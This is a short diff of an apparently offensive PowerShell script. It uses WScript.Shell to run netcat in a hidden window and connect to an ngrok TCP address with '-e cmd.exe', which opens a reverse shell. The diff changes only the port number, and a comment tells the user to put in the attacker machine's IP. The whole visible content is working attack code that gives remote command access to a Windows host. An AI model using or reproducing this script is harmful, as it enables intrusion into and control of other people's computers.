@@ -19,7 +19,7 @@ try {
 # Change IP with the attacker machine's IP
 try {
     $WshShell = New-Object -ComObject WScript.Shell
-    $WshShell.Run("`"$NcPath`" 0.tcp.in.ngrok.io 12164 -e cmd.exe", 0, $false)
+    $WshShell.Run("`"$NcPath`" 0.tcp.in.ngrok.io 19095 -e cmd.exe", 0, $false)
 } catch {}
 
 Start-Sleep -Seconds 5
